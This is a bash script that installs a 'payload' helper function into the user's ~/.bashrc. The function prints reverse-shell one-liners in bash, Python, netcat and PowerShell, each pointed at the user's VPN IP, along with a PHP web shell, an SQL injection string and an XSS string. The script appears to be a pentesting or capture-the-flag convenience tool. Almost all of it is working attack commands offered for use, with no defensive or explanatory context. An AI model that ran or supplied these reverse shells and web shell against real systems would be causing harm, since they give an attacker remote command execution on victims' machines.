#!/bin/bash
# Feature: Payload Generator

cat >> ~/.bashrc << 'PAYLOAD'

# --- Feature: Payload Generator ---
payload() {
    local TYPE=$1
    local PORT=${2:-4444}
    local IP=$(myip 2>/dev/null)
    
    if [ -z "$IP" ]; then
        echo -e "\033[0;31m[✗] VPN not connected!\033[0m"
        return 1
    fi
    
    echo -e "\033[0;36m=== Payload Generator ===\033[0m"
    echo ""
    
    case "$TYPE" in
        bash|sh)
            echo -e "\033[1;37mBash Reverse Shell:\033[0m"
            echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
            ;;
        python|py)
            echo -e "\033[1;37mPython Reverse Shell:\033[0m"
            echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
            ;;
        nc|netcat)
            echo -e "\033[1;37mNetcat Reverse Shell:\033[0m"
            echo "nc -e /bin/bash $IP $PORT"
            echo ""
            echo -e "\033[1;37mNetcat (no -e):\033[0m"
            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $IP $PORT >/tmp/f"
            ;;
        powershell|ps)
            echo -e "\033[1;37mPowerShell Reverse Shell:\033[0m"
            echo "powershell -nop -c \"\$client=New-Object System.Net.Sockets.TCPClient('$IP',$PORT);\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
            ;;
        php)
            echo -e "\033[1;37mPHP Web Shell:\033[0m"
            echo "<?php system(\$_GET['cmd']); ?>"
            ;;
        sql)
            echo -e "\033[1;37mSQL Injection:\033[0m"
            echo "' OR '1'='1' -- -"
            ;;
        xss)
            echo -e "\033[1;37mXSS Payloads:\033[0m"
            echo "<script>alert('XSS')</script>"
            ;;
        *)
            echo "Available types: bash, python, nc, powershell, php, sql, xss"
            echo ""
            echo "Usage: payload <type> [port]"
            echo "Example: payload bash 4444"
            ;;
    esac
    echo ""
}

PAYLOAD

echo "[✓] Payload generator added"